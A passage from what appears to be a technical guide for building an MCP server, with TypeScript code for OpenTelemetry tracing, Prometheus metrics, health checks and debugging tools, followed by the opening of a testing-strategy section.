import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';
import { W3CTraceContextPropagator } from '@opentelemetry/core';

/**
 * Tracing configuration
 */
interface TracingConfig {
  serviceName: string;
  serviceVersion: string;
  environment: string;
  endpoint: string;
  sampleRate: number;
}

/**
 * Span attributes for MCP operations
 */
interface MCPSpanAttributes {
  'mcp.operation': string;
  'mcp.tenant_id'?: string;
  'mcp.session_id'?: string;
  'mcp.request_id'?: string;
  'mcp.tool_name'?: string;
  'mcp.resource_uri'?: string;
  'mcp.tokens_used'?: number;
  'mcp.cached'?: boolean;
}

/**
 * MCP Tracing Manager
 */
export class MCPTracingManager {
  private tracer: Tracer;
  private provider: NodeTracerProvider;
  private config: TracingConfig;
  
  constructor(config: TracingConfig) {
    this.config = config;
    
    // Create resource
    const resource = new Resource({
      [SemanticResourceAttributes.SERVICE_NAME]: config.serviceName,
      [SemanticResourceAttributes.SERVICE_VERSION]: config.serviceVersion,
      [SemanticResourceAttributes.DEPLOYMENT_ENVIRONMENT]: config.environment
    });
    
    // Create provider
    this.provider = new NodeTracerProvider({
      resource,
      sampler: new TraceIdRatioBasedSampler(config.sampleRate)
    });
    
    // Configure exporter
    const exporter = new OTLPTraceExporter({
      url: config.endpoint
    });
    
    this.provider.addSpanProcessor(new BatchSpanProcessor(exporter, {
      maxQueueSize: 2048,
      scheduledDelayMillis: 5000,
      maxExportBatchSize: 512
    }));
    
    // Set global propagator
    propagation.setGlobalPropagator(new W3CTraceContextPropagator());
    
    // Register provider
    this.provider.register();
    
    // Get tracer
    this.tracer = trace.getTracer(config.serviceName, config.serviceVersion);
  }
  
  /**
   * Start a new span
   */
  startSpan(
    name: string,
    options?: {
      kind?: SpanKind;
      attributes?: MCPSpanAttributes;
      parentContext?: Context;
    }
  ): Span {
    const parentCtx = options?.parentContext || context.active();
    
    return this.tracer.startSpan(
      name,
      {
        kind: options?.kind || SpanKind.INTERNAL,
        attributes: options?.attributes as any
      },
      parentCtx
    );
  }
  
  /**
   * Create span for MCP request
   */
  startMCPRequestSpan(
    operation: string,
    req: {
      requestId: string;
      tenantId?: string;
      sessionId?: string;
    }
  ): Span {
    return this.startSpan(`mcp.${operation}`, {
      kind: SpanKind.SERVER,
      attributes: {
        'mcp.operation': operation,
        'mcp.request_id': req.requestId,
        'mcp.tenant_id': req.tenantId,
        'mcp.session_id': req.sessionId
      }
    });
  }
  
  /**
   * Create span for tool execution
   */
  startToolSpan(
    toolName: string,
    parentSpan?: Span
  ): Span {
    const parentCtx = parentSpan 
      ? trace.setSpan(context.active(), parentSpan)
      : context.active();
    
    return this.startSpan(`mcp.tool.${toolName}`, {
      kind: SpanKind.INTERNAL,
      attributes: {
        'mcp.operation': 'tool_execution',
        'mcp.tool_name': toolName
      },
      parentContext: parentCtx
    });
  }
  
  /**
   * Create span for resource access
   */
  startResourceSpan(
    uri: string,
    operation: 'read' | 'list' | 'subscribe',
    parentSpan?: Span
  ): Span {
    const parentCtx = parentSpan 
      ? trace.setSpan(context.active(), parentSpan)
      : context.active();
    
    return this.startSpan(`mcp.resource.${operation}`, {
      kind: SpanKind.INTERNAL,
      attributes: {
        'mcp.operation': `resource_${operation}`,
        'mcp.resource_uri': uri
      },
      parentContext: parentCtx
    });
  }
  
  /**
   * Create span for external service call
   */
  startExternalSpan(
    serviceName: string,
    operation: string,
    parentSpan?: Span
  ): Span {
    const parentCtx = parentSpan 
      ? trace.setSpan(context.active(), parentSpan)
      : context.active();
    
    return this.startSpan(`external.${serviceName}.${operation}`, {
      kind: SpanKind.CLIENT,
      attributes: {
        'mcp.operation': 'external_call',
        'peer.service': serviceName
      } as any,
      parentContext: parentCtx
    });
  }
  
  /**
   * Record span success
   */
  endSpanSuccess(span: Span, attributes?: Record<string, any>): void {
    if (attributes) {
      span.setAttributes(attributes);
    }
    span.setStatus({ code: SpanStatusCode.OK });
    span.end();
  }
  
  /**
   * Record span error
   */
  endSpanError(span: Span, error: Error, attributes?: Record<string, any>): void {
    if (attributes) {
      span.setAttributes(attributes);
    }
    span.setStatus({
      code: SpanStatusCode.ERROR,
      message: error.message
    });
    span.recordException(error);
    span.end();
  }
  
  /**
   * Execute function with tracing
   */
  async withSpan<T>(
    name: string,
    fn: (span: Span) => Promise<T>,
    options?: {
      kind?: SpanKind;
      attributes?: Record<string, any>;
    }
  ): Promise<T> {
    const span = this.startSpan(name, options as any);
    
    try {
      const result = await context.with(
        trace.setSpan(context.active(), span),
        () => fn(span)
      );
      
      this.endSpanSuccess(span);
      return result;
    } catch (error) {
      this.endSpanError(span, error as Error);
      throw error;
    }
  }
  
  /**
   * Extract trace context from headers
   */
  extractContext(headers: Record<string, string>): Context {
    return propagation.extract(context.active(), headers);
  }
  
  /**
   * Inject trace context into headers
   */
  injectContext(headers: Record<string, string>): void {
    propagation.inject(context.active(), headers);
  }
  
  /**
   * Get current trace ID
   */
  getCurrentTraceId(): string | undefined {
    const span = trace.getSpan(context.active());
    return span?.spanContext().traceId;
  }
  
  /**
   * Shutdown tracing
   */
  async shutdown(): Promise<void> {
    await this.provider.shutdown();
  }
}

/**
 * Simple ratio-based sampler
 */
class TraceIdRatioBasedSampler {
  private ratio: number;
  
  constructor(ratio: number) {
    this.ratio = Math.max(0, Math.min(1, ratio));
  }
  
  shouldSample(): { decision: number } {
    return {
      decision: Math.random() < this.ratio ? 1 : 0 // RECORD_AND_SAMPLED : NOT_RECORD
    };
  }
}
```

### 9.4 Metrics Collection

```typescript
// src/workers/L/monitoring/metrics.ts
import { 
  Counter, 
  Histogram, 
  Gauge, 
  Registry, 
  collectDefaultMetrics 
} from 'prom-client';

/**
 * MCP Metrics Registry
 */
export class MCPMetricsRegistry {
  private registry: Registry;
  
  // Request metrics
  public requestsTotal: Counter;
  public requestDuration: Histogram;
  public activeRequests: Gauge;
  
  // Tool metrics
  public toolExecutionsTotal: Counter;
  public toolExecutionDuration: Histogram;
  public toolErrors: Counter;
  
  // Resource metrics
  public resourceAccessTotal: Counter;
  public resourceLoadDuration: Histogram;
  public resourceCacheHits: Counter;
  public resourceCacheMisses: Counter;
  
  // Session metrics
  public activeSessions: Gauge;
  public sessionDuration: Histogram;
  public sessionsCreated: Counter;
  public sessionsExpired: Counter;
  
  // AI/LLM metrics
  public tokensUsed: Counter;
  public llmLatency: Histogram;
  public llmErrors: Counter;
  
  // Queue metrics
  public queueDepth: Gauge;
  public queueLatency: Histogram;
  public queueProcessed: Counter;
  
  // System metrics
  public memoryUsage: Gauge;
  public cpuUsage: Gauge;
  public eventLoopLag: Gauge;
  
  constructor() {
    this.registry = new Registry();
    
    // Collect default Node.js metrics
    collectDefaultMetrics({ register: this.registry });
    
    this.initializeMetrics();
  }
  
  private initializeMetrics(): void {
    // Request metrics
    this.requestsTotal = new Counter({
      name: 'mcp_requests_total',
      help: 'Total number of MCP requests',
      labelNames: ['method', 'status', 'tenant_id'],
      registers: [this.registry]
    });
    
    this.requestDuration = new Histogram({
      name: 'mcp_request_duration_seconds',
      help: 'MCP request duration in seconds',
      labelNames: ['method', 'status'],
      buckets: [0.01, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5, 10],
      registers: [this.registry]
    });
    
    this.activeRequests = new Gauge({
      name: 'mcp_active_requests',
      help: 'Number of currently active requests',
      labelNames: ['method'],
      registers: [this.registry]
    });
    
    // Tool metrics
    this.toolExecutionsTotal = new Counter({
      name: 'mcp_tool_executions_total',
      help: 'Total number of tool executions',
      labelNames: ['tool_name', 'status', 'tenant_id'],
      registers: [this.registry]
    });
    
    this.toolExecutionDuration = new Histogram({
      name: 'mcp_tool_execution_duration_seconds',
      help: 'Tool execution duration in seconds',
      labelNames: ['tool_name'],
      buckets: [0.01, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5, 10, 30],
      registers: [this.registry]
    });
    
    this.toolErrors = new Counter({
      name: 'mcp_tool_errors_total',
      help: 'Total number of tool execution errors',
      labelNames: ['tool_name', 'error_type'],
      registers: [this.registry]
    });
    
    // Resource metrics
    this.resourceAccessTotal = new Counter({
      name: 'mcp_resource_access_total',
      help: 'Total number of resource accesses',
      labelNames: ['resource_type', 'operation'],
      registers: [this.registry]
    });
    
    this.resourceLoadDuration = new Histogram({
      name: 'mcp_resource_load_duration_seconds',
      help: 'Resource load duration in seconds',
      labelNames: ['resource_type', 'cached'],
      buckets: [0.001, 0.005, 0.01, 0.05, 0.1, 0.25, 0.5, 1],
      registers: [this.registry]
    });
    
    this.resourceCacheHits = new Counter({
      name: 'mcp_resource_cache_hits_total',
      help: 'Total number of resource cache hits',
      labelNames: ['resource_type'],
      registers: [this.registry]
    });
    
    this.resourceCacheMisses = new Counter({
      name: 'mcp_resource_cache_misses_total',
      help: 'Total number of resource cache misses',
      labelNames: ['resource_type'],
      registers: [this.registry]
    });
    
    // Session metrics
    this.activeSessions = new Gauge({
      name: 'mcp_active_sessions',
      help: 'Number of currently active sessions',
      labelNames: ['tenant_id'],
      registers: [this.registry]
    });
    
    this.sessionDuration = new Histogram({
      name: 'mcp_session_duration_seconds',
      help: 'Session duration in seconds',
      labelNames: ['termination_reason'],
      buckets: [60, 300, 600, 1800, 3600, 7200, 14400],
      registers: [this.registry]
    });
    
    this.sessionsCreated = new Counter({
      name: 'mcp_sessions_created_total',
      help: 'Total number of sessions created',
      labelNames: ['tenant_id'],
      registers: [this.registry]
    });
    
    this.sessionsExpired = new Counter({
      name: 'mcp_sessions_expired_total',
      help: 'Total number of sessions expired',
      labelNames: ['reason'],
      registers: [this.registry]
    });
    
    // AI/LLM metrics
    this.tokensUsed = new Counter({
      name: 'mcp_tokens_used_total',
      help: 'Total number of tokens used',
      labelNames: ['type', 'model', 'tenant_id'],
      registers: [this.registry]
    });
    
    this.llmLatency = new Histogram({
      name: 'mcp_llm_latency_seconds',
      help: 'LLM API latency in seconds',
      labelNames: ['model', 'operation'],
      buckets: [0.1, 0.5, 1, 2, 5, 10, 20, 30, 60],
      registers: [this.registry]
    });
    
    this.llmErrors = new Counter({
      name: 'mcp_llm_errors_total',
      help: 'Total number of LLM errors',
      labelNames: ['model', 'error_type'],
      registers: [this.registry]
    });
    
    // Queue metrics
    this.queueDepth = new Gauge({
      name: 'mcp_queue_depth',
      help: 'Current queue depth',
      labelNames: ['queue_name'],
      registers: [this.registry]
    });
    
    this.queueLatency = new Histogram({
      name: 'mcp_queue_latency_seconds',
      help: 'Queue processing latency in seconds',
      labelNames: ['queue_name'],
      buckets: [0.01, 0.05, 0.1, 0.5, 1, 5, 10, 30],
      registers: [this.registry]
    });
    
    this.queueProcessed = new Counter({
      name: 'mcp_queue_processed_total',
      help: 'Total number of queue jobs processed',
      labelNames: ['queue_name', 'status'],
      registers: [this.registry]
    });
    
    // System metrics
    this.memoryUsage = new Gauge({
      name: 'mcp_memory_usage_bytes',
      help: 'Memory usage in bytes',
      labelNames: ['type'],
      registers: [this.registry]
    });
    
    this.cpuUsage = new Gauge({
      name: 'mcp_cpu_usage_percent',
      help: 'CPU usage percentage',
      registers: [this.registry]
    });
    
    this.eventLoopLag = new Gauge({
      name: 'mcp_event_loop_lag_seconds',
      help: 'Event loop lag in seconds',
      registers: [this.registry]
    });
  }
  
  /**
   * Record request
   */
  recordRequest(params: {
    method: string;
    status: number;
    tenantId: string;
    duration: number;
  }): void {
    const statusLabel = params.status < 400 ? 'success' : 
                       params.status < 500 ? 'client_error' : 'server_error';
    
    this.requestsTotal.inc({
      method: params.method,
      status: statusLabel,
      tenant_id: params.tenantId
    });
    
    this.requestDuration.observe(
      { method: params.method, status: statusLabel },
      params.duration / 1000
    );
  }
  
  /**
   * Record tool execution
   */
  recordToolExecution(params: {
    toolName: string;
    success: boolean;
    tenantId: string;
    duration: number;
    errorType?: string;
  }): void {
    this.toolExecutionsTotal.inc({
      tool_name: params.toolName,
      status: params.success ? 'success' : 'failure',
      tenant_id: params.tenantId
    });
    
    this.toolExecutionDuration.observe(
      { tool_name: params.toolName },
      params.duration / 1000
    );
    
    if (!params.success && params.errorType) {
      this.toolErrors.inc({
        tool_name: params.toolName,
        error_type: params.errorType
      });
    }
  }
  
  /**
   * Record resource access
   */
  recordResourceAccess(params: {
    resourceType: string;
    operation: 'read' | 'list' | 'subscribe';
    cached: boolean;
    duration: number;
  }): void {
    this.resourceAccessTotal.inc({
      resource_type: params.resourceType,
      operation: params.operation
    });
    
    this.resourceLoadDuration.observe(
      { 
        resource_type: params.resourceType,
        cached: String(params.cached)
      },
      params.duration / 1000
    );
    
    if (params.cached) {
      this.resourceCacheHits.inc({ resource_type: params.resourceType });
    } else {
      this.resourceCacheMisses.inc({ resource_type: params.resourceType });
    }
  }
  
  /**
   * Record LLM usage
   */
  recordLLMUsage(params: {
    model: string;
    inputTokens: number;
    outputTokens: number;
    tenantId: string;
    duration: number;
    success: boolean;
    errorType?: string;
  }): void {
    this.tokensUsed.inc(
      { type: 'input', model: params.model, tenant_id: params.tenantId },
      params.inputTokens
    );
    
    this.tokensUsed.inc(
      { type: 'output', model: params.model, tenant_id: params.tenantId },
      params.outputTokens
    );
    
    this.llmLatency.observe(
      { model: params.model, operation: 'completion' },
      params.duration / 1000
    );
    
    if (!params.success && params.errorType) {
      this.llmErrors.inc({
        model: params.model,
        error_type: params.errorType
      });
    }
  }
  
  /**
   * Update system metrics
   */
  updateSystemMetrics(): void {
    const memUsage = process.memoryUsage();
    this.memoryUsage.set({ type: 'heap_used' }, memUsage.heapUsed);
    this.memoryUsage.set({ type: 'heap_total' }, memUsage.heapTotal);
    this.memoryUsage.set({ type: 'rss' }, memUsage.rss);
    this.memoryUsage.set({ type: 'external' }, memUsage.external);
    
    // CPU usage requires sampling
    const cpuUsage = process.cpuUsage();
    const totalCpuTime = cpuUsage.user + cpuUsage.system;
    this.cpuUsage.set(totalCpuTime / 1000000); // Convert to seconds
  }
  
  /**
   * Get metrics in Prometheus format
   */
  async getMetrics(): Promise<string> {
    return this.registry.metrics();
  }
  
  /**
   * Get metrics in JSON format
   */
  async getMetricsJSON(): Promise<object> {
    return this.registry.getMetricsAsJSON();
  }
  
  /**
   * Get registry
   */
  getRegistry(): Registry {
    return this.registry;
  }
}

// Singleton instance
let metricsInstance: MCPMetricsRegistry | null = null;

export function getMetrics(): MCPMetricsRegistry {
  if (!metricsInstance) {
    metricsInstance = new MCPMetricsRegistry();
  }
  return metricsInstance;
}
```

### 9.5 Health Checks

```typescript
// src/workers/L/monitoring/health-checks.ts
import { Redis } from 'ioredis';
import { Pool } from 'pg';
import { EventEmitter } from 'events';

/**
 * Health status
 */
type HealthStatus = 'healthy' | 'degraded' | 'unhealthy';

/**
 * Component health result
 */
interface ComponentHealth {
  name: string;
  status: HealthStatus;
  latency?: number;
  message?: string;
  details?: Record<string, any>;
  lastCheck: Date;
}

/**
 * Overall health result
 */
interface HealthResult {
  status: HealthStatus;
  timestamp: Date;
  uptime: number;
  version: string;
  components: ComponentHealth[];
  checks: {
    passed: number;
    failed: number;
    degraded: number;
  };
}

/**
 * Health check function type
 */
type HealthCheckFn = () => Promise<ComponentHealth>;

/**
 * Health Check Manager
 */
export class HealthCheckManager extends EventEmitter {
  private checks: Map<string, HealthCheckFn>;
  private lastResults: Map<string, ComponentHealth>;
  private checkInterval?: NodeJS.Timeout;
  private startTime: Date;
  
  constructor() {
    super();
    this.checks = new Map();
    this.lastResults = new Map();
    this.startTime = new Date();
  }
  
  /**
   * Register health check
   */
  registerCheck(name: string, checkFn: HealthCheckFn): void {
    this.checks.set(name, checkFn);
  }
  
  /**
   * Run all health checks
   */
  async runChecks(): Promise<HealthResult> {
    const results: ComponentHealth[] = [];
    let passed = 0;
    let failed = 0;
    let degraded = 0;
    
    for (const [name, checkFn] of this.checks) {
      try {
        const result = await checkFn();
        results.push(result);
        this.lastResults.set(name, result);
        
        switch (result.status) {
          case 'healthy': passed++; break;
          case 'degraded': degraded++; break;
          case 'unhealthy': failed++; break;
        }
        
        // Emit events for state changes
        const previousResult = this.lastResults.get(name);
        if (previousResult && previousResult.status !== result.status) {
          this.emit('statusChange', {
            component: name,
            previous: previousResult.status,
            current: result.status
          });
        }
      } catch (error) {
        const errorResult: ComponentHealth = {
          name,
          status: 'unhealthy',
          message: `Check failed: ${error}`,
          lastCheck: new Date()
        };
        results.push(errorResult);
        this.lastResults.set(name, errorResult);
        failed++;
      }
    }
    
    // Determine overall status
    let overallStatus: HealthStatus = 'healthy';
    if (failed > 0) {
      overallStatus = 'unhealthy';
    } else if (degraded > 0) {
      overallStatus = 'degraded';
    }
    
    const healthResult: HealthResult = {
      status: overallStatus,
      timestamp: new Date(),
      uptime: Date.now() - this.startTime.getTime(),
      version: process.env.npm_package_version || '1.0.0',
      components: results,
      checks: { passed, failed, degraded }
    };
    
    this.emit('healthCheck', healthResult);
    
    return healthResult;
  }
  
  /**
   * Run single check
   */
  async runCheck(name: string): Promise<ComponentHealth | null> {
    const checkFn = this.checks.get(name);
    if (!checkFn) {
      return null;
    }
    
    try {
      const result = await checkFn();
      this.lastResults.set(name, result);
      return result;
    } catch (error) {
      return {
        name,
        status: 'unhealthy',
        message: `Check failed: ${error}`,
        lastCheck: new Date()
      };
    }
  }
  
  /**
   * Start periodic health checks
   */
  startPeriodicChecks(intervalMs: number = 30000): void {
    this.checkInterval = setInterval(async () => {
      await this.runChecks();
    }, intervalMs);
  }
  
  /**
   * Stop periodic health checks
   */
  stopPeriodicChecks(): void {
    if (this.checkInterval) {
      clearInterval(this.checkInterval);
      this.checkInterval = undefined;
    }
  }
  
  /**
   * Get last results
   */
  getLastResults(): HealthResult {
    const results = Array.from(this.lastResults.values());
    
    let passed = 0;
    let failed = 0;
    let degraded = 0;
    
    for (const result of results) {
      switch (result.status) {
        case 'healthy': passed++; break;
        case 'degraded': degraded++; break;
        case 'unhealthy': failed++; break;
      }
    }
    
    let overallStatus: HealthStatus = 'healthy';
    if (failed > 0) {
      overallStatus = 'unhealthy';
    } else if (degraded > 0) {
      overallStatus = 'degraded';
    }
    
    return {
      status: overallStatus,
      timestamp: new Date(),
      uptime: Date.now() - this.startTime.getTime(),
      version: process.env.npm_package_version || '1.0.0',
      components: results,
      checks: { passed, failed, degraded }
    };
  }
  
  /**
   * Liveness check (is the process alive?)
   */
  async liveness(): Promise<boolean> {
    return true; // If we can respond, we're alive
  }
  
  /**
   * Readiness check (can we serve traffic?)
   */
  async readiness(): Promise<boolean> {
    const result = await this.runChecks();
    return result.status !== 'unhealthy';
  }
}

/**
 * Create standard health checks
 */
export function createStandardHealthChecks(
  healthManager: HealthCheckManager,
  dependencies: {
    redis?: Redis;
    postgres?: Pool;
    bullmqConnection?: Redis;
  }
): void {
  // Redis health check
  if (dependencies.redis) {
    healthManager.registerCheck('redis', async () => {
      const start = Date.now();
      try {
        await dependencies.redis!.ping();
        return {
          name: 'redis',
          status: 'healthy',
          latency: Date.now() - start,
          lastCheck: new Date()
        };
      } catch (error) {
        return {
          name: 'redis',
          status: 'unhealthy',
          latency: Date.now() - start,
          message: `Redis error: ${error}`,
          lastCheck: new Date()
        };
      }
    });
  }
  
  // PostgreSQL health check
  if (dependencies.postgres) {
    healthManager.registerCheck('postgres', async () => {
      const start = Date.now();
      try {
        const result = await dependencies.postgres!.query('SELECT 1 as health');
        const poolStats = {
          total: dependencies.postgres!.totalCount,
          idle: dependencies.postgres!.idleCount,
          waiting: dependencies.postgres!.waitingCount
        };
        
        // Degraded if too many waiting connections
        const status: HealthStatus = poolStats.waiting > 10 ? 'degraded' : 'healthy';
        
        return {
          name: 'postgres',
          status,
          latency: Date.now() - start,
          details: poolStats,
          lastCheck: new Date()
        };
      } catch (error) {
        return {
          name: 'postgres',
          status: 'unhealthy',
          latency: Date.now() - start,
          message: `PostgreSQL error: ${error}`,
          lastCheck: new Date()
        };
      }
    });
  }
  
  // BullMQ health check
  if (dependencies.bullmqConnection) {
    healthManager.registerCheck('bullmq', async () => {
      const start = Date.now();
      try {
        await dependencies.bullmqConnection!.ping();
        return {
          name: 'bullmq',
          status: 'healthy',
          latency: Date.now() - start,
          lastCheck: new Date()
        };
      } catch (error) {
        return {
          name: 'bullmq',
          status: 'unhealthy',
          latency: Date.now() - start,
          message: `BullMQ error: ${error}`,
          lastCheck: new Date()
        };
      }
    });
  }
  
  // Memory health check
  healthManager.registerCheck('memory', async () => {
    const memUsage = process.memoryUsage();
    const heapUsedPercent = (memUsage.heapUsed / memUsage.heapTotal) * 100;
    
    let status: HealthStatus = 'healthy';
    if (heapUsedPercent > 90) {
      status = 'unhealthy';
    } else if (heapUsedPercent > 75) {
      status = 'degraded';
    }
    
    return {
      name: 'memory',
      status,
      details: {
        heapUsed: memUsage.heapUsed,
        heapTotal: memUsage.heapTotal,
        heapUsedPercent: Math.round(heapUsedPercent),
        rss: memUsage.rss,
        external: memUsage.external
      },
      lastCheck: new Date()
    };
  });
  
  // Event loop health check
  healthManager.registerCheck('eventLoop', async () => {
    return new Promise((resolve) => {
      const start = Date.now();
      setImmediate(() => {
        const lag = Date.now() - start;
        
        let status: HealthStatus = 'healthy';
        if (lag > 100) {
          status = 'unhealthy';
        } else if (lag > 50) {
          status = 'degraded';
        }
        
        resolve({
          name: 'eventLoop',
          status,
          latency: lag,
          message: `Event loop lag: ${lag}ms`,
          lastCheck: new Date()
        });
      });
    });
  });
}
```

### 9.6 Debugging Tools

```typescript
// src/workers/L/monitoring/debugging.ts
import { EventEmitter } from 'events';
import { MCPLogger } from './structured-logger';

/**
 * Debug session configuration
 */
interface DebugConfig {
  enabled: boolean;
  verboseLogging: boolean;
  capturePayloads: boolean;
  maxCapturedPayloads: number;
  slowRequestThreshold: number; // ms
  traceRequests: string[]; // Request IDs to trace
}

/**
 * Captured request/response
 */
interface CapturedExchange {
  requestId: string;
  timestamp: Date;
  method: string;
  path?: string;
  request: any;
  response?: any;
  duration?: number;
  error?: any;
}

/**
 * Debug statistics
 */
interface DebugStats {
  totalRequests: number;
  slowRequests: number;
  errorRequests: number;
  averageLatency: number;
  p95Latency: number;
  p99Latency: number;
}

/**
 * MCP Debug Manager
 */
export class MCPDebugManager extends EventEmitter {
  private logger: MCPLogger;
  private config: DebugConfig;
  private capturedExchanges: CapturedExchange[];
  private latencies: number[];
  private stats: {
    totalRequests: number;
    slowRequests: number;
    errorRequests: number;
  };
  
  constructor(logger: MCPLogger, config?: Partial<DebugConfig>) {
    super();
    this.logger = logger;
    this.config = {
      enabled: process.env.DEBUG === 'true',
      verboseLogging: false,
      capturePayloads: false,
      maxCapturedPayloads: 100,
      slowRequestThreshold: 1000,
      traceRequests: [],
      ...config
    };
    
    this.capturedExchanges = [];
    this.latencies = [];
    this.stats = {
      totalRequests: 0,
      slowRequests: 0,
      errorRequests: 0
    };
  }
  
  /**
   * Enable debugging
   */
  enable(config?: Partial<DebugConfig>): void {
    this.config = { ...this.config, ...config, enabled: true };
    this.logger.info('Debug mode enabled', { config: this.config });
  }
  
  /**
   * Disable debugging
   */
  disable(): void {
    this.config.enabled = false;
    this.logger.info('Debug mode disabled');
  }
  
  /**
   * Capture request start
   */
  captureRequest(params: {
    requestId: string;
    method: string;
    path?: string;
    payload?: any;
  }): void {
    if (!this.config.enabled) return;
    
    const exchange: CapturedExchange = {
      requestId: params.requestId,
      timestamp: new Date(),
      method: params.method,
      path: params.path,
      request: this.config.capturePayloads ? params.payload : undefined
    };
    
    this.addCapturedExchange(exchange);
    
    if (this.config.verboseLogging || this.shouldTraceRequest(params.requestId)) {
      this.logger.debug('Request captured', {
        requestId: params.requestId,
        method: params.method,
        path: params.path
      });
    }
  }
  
  /**
   * Capture response
   */
  captureResponse(params: {
    requestId: string;
    response?: any;
    duration: number;
    error?: any;
  }): void {
    if (!this.config.enabled) return;
    
    // Find and update exchange
    const exchange = this.capturedExchanges.find(
      e => e.requestId === params.requestId
    );
    
    if (exchange) {
      exchange.response = this.config.capturePayloads ? params.response : undefined;
      exchange.duration = params.duration;
      exchange.error = params.error;
    }
    
    // Update stats
    this.stats.totalRequests++;
    this.latencies.push(params.duration);
    
    if (params.duration > this.config.slowRequestThreshold) {
      this.stats.slowRequests++;
      this.logger.warn('Slow request detected', {
        requestId: params.requestId,
        duration: params.duration,
        threshold: this.config.slowRequestThreshold
      });
      this.emit('slowRequest', { requestId: params.requestId, duration: params.duration });
    }
    
    if (params.error) {
      this.stats.errorRequests++;
      this.emit('errorRequest', { requestId: params.requestId, error: params.error });
    }
    
    if (this.config.verboseLogging || this.shouldTraceRequest(params.requestId)) {
      this.logger.debug('Response captured', {
        requestId: params.requestId,
        duration: params.duration,
        hasError: !!params.error
      });
    }
  }
  
  /**
   * Add request to trace list
   */
  traceRequest(requestId: string): void {
    if (!this.config.traceRequests.includes(requestId)) {
      this.config.traceRequests.push(requestId);
    }
  }
  
  /**
   * Get captured exchanges
   */
  getCapturedExchanges(filter?: {
    method?: string;
    minDuration?: number;
    hasError?: boolean;
    limit?: number;
  }): CapturedExchange[] {
    let result = [...this.capturedExchanges];
    
    if (filter?.method) {
      result = result.filter(e => e.method === filter.method);
    }
    
    if (filter?.minDuration !== undefined) {
      result = result.filter(e => (e.duration || 0) >= filter.minDuration!);
    }
    
    if (filter?.hasError !== undefined) {
      result = result.filter(e => !!e.error === filter.hasError);
    }
    
    if (filter?.limit) {
      result = result.slice(-filter.limit);
    }
    
    return result;
  }
  
  /**
   * Get exchange by request ID
   */
  getExchange(requestId: string): CapturedExchange | undefined {
    return this.capturedExchanges.find(e => e.requestId === requestId);
  }
  
  /**
   * Get debug statistics
   */
  getStats(): DebugStats {
    const sortedLatencies = [...this.latencies].sort((a, b) => a - b);
    
    return {
      totalRequests: this.stats.totalRequests,
      slowRequests: this.stats.slowRequests,
      errorRequests: this.stats.errorRequests,
      averageLatency: this.latencies.length > 0
        ? this.latencies.reduce((a, b) => a + b, 0) / this.latencies.length
        : 0,
      p95Latency: this.getPercentile(sortedLatencies, 95),
      p99Latency: this.getPercentile(sortedLatencies, 99)
    };
  }
  
  /**
   * Clear captured data
   */
  clear(): void {
    this.capturedExchanges = [];
    this.latencies = [];
    this.stats = {
      totalRequests: 0,
      slowRequests: 0,
      errorRequests: 0
    };
  }
  
  /**
   * Dump debug info
   */
  dump(): string {
    return JSON.stringify({
      config: this.config,
      stats: this.getStats(),
      recentExchanges: this.capturedExchanges.slice(-10),
      slowExchanges: this.getCapturedExchanges({ 
        minDuration: this.config.slowRequestThreshold,
        limit: 10
      }),
      errorExchanges: this.getCapturedExchanges({
        hasError: true,
        limit: 10
      })
    }, null, 2);
  }
  
  // Private helpers
  
  private addCapturedExchange(exchange: CapturedExchange): void {
    this.capturedExchanges.push(exchange);
    
    // Trim if exceeded max
    if (this.capturedExchanges.length > this.config.maxCapturedPayloads) {
      this.capturedExchanges.shift();
    }
  }
  
  private shouldTraceRequest(requestId: string): boolean {
    return this.config.traceRequests.includes(requestId);
  }
  
  private getPercentile(sortedArray: number[], percentile: number): number {
    if (sortedArray.length === 0) return 0;
    
    const index = Math.ceil((percentile / 100) * sortedArray.length) - 1;
    return sortedArray[Math.max(0, index)];
  }
}

/**
 * Request context debugger
 */
export class RequestContextDebugger {
  private contextStack: Map<string, any[]>;
  private logger: MCPLogger;
  
  constructor(logger: MCPLogger) {
    this.contextStack = new Map();
    this.logger = logger;
  }
  
  /**
   * Push context
   */
  pushContext(requestId: string, context: any): void {
    if (!this.contextStack.has(requestId)) {
      this.contextStack.set(requestId, []);
    }
    this.contextStack.get(requestId)!.push({
      ...context,
      timestamp: new Date()
    });
  }
  
  /**
   * Get context trace
   */
  getContextTrace(requestId: string): any[] {
    return this.contextStack.get(requestId) || [];
  }
  
  /**
   * Clear context
   */
  clearContext(requestId: string): void {
    this.contextStack.delete(requestId);
  }
  
  /**
   * Log context trace
   */
  logContextTrace(requestId: string): void {
    const trace = this.getContextTrace(requestId);
    this.logger.debug('Context trace', { requestId, trace });
  }
}
```

---

## 10. Testing & Validation

### 10.1 Testing Strategy Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MCP SERVER TESTING PYRAMID                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│                           ┌───────────┐                                      │
│                           │   E2E     │  ← 5% (Critical paths only)          │
│                           │   Tests   │                                      │
│                         ┌─┴───────────┴─┐                                    │
│                         │  Integration  │  ← 25% (Component boundaries)      │
│                         │    Tests      │                                    │
│                       ┌─┴───────────────┴─┐                                  │
│                       │    Unit Tests     │  ← 70% (Business logic)          │
│                       │                   │                                  │
│                       └───────────────────┘                                  │
│                                                                              │
│  Test Categories:                                                            │
│  ├─ Unit Tests - Individual functions, classes, modules                     │
│  ├─ Integration Tests - Service interactions, database, external APIs       │
│  ├─ Contract Tests - API contracts, schema validation                       │
│  ├─ Load Tests - Performance under stress                                   │
│  ├─ Security Tests - Vulnerability scanning, penetration testing           │
│  └─ E2E Tests - Full conversation flows                                     │
│                                                                              │
│  Coverage Requirements:                                                      │
│  ├─ Core Logic: 90%+ coverage                                               │
│  ├─ Tool Handlers: 85%+ coverage                                            │
│  ├─ Error Paths: 100% coverage                                              │
│  └─ Security Code: 100% coverage                                            │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 10.2 Unit Testing Framework

```typescript
// tests/unit/setup.ts
import { vi, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';

/**
 * Test configuration
 */
export const testConfig = {
  timeout: 30000,
  retries: 0,
  mockExternalServices: true,
  enableSnapshots: true,
  coverage: {
    threshold: {
      lines: 80,
      functions: 80,
      branches: 75,
      statements: 80
    }
  }
};

/**
 * Mock factories
 */
export class MockFactory {
  /**
   * Create mock tenant context
   */
  static createTenantContext(overrides: Partial<TenantContext> = {}): TenantContext {
    return {
      tenantId: 'test-tenant-001',
      userId: 'test-user-001',
